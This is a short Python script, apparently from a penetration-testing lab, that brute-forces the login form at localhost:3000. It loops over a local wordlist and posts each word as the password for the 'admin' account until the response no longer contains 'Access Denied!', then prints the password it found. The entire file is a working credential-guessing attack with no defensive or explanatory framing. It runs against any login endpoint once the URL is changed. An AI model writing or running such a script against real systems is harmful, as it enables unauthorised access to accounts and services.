import requests

url = "http://localhost:3000/"

wordlist = open("../pentest/wordlist.txt", "r").readlines()

for word in wordlist:
	password = word.strip()
	payload = data={"username": "admin", "password": password}

	req = requests.post(url, payload)
	content = req.content

	if "Access Denied!" in str(content):
		print(f"[-] Incorrect Password: {password}")
	else:
		print(f"[+] Password Found: {password}")
		break
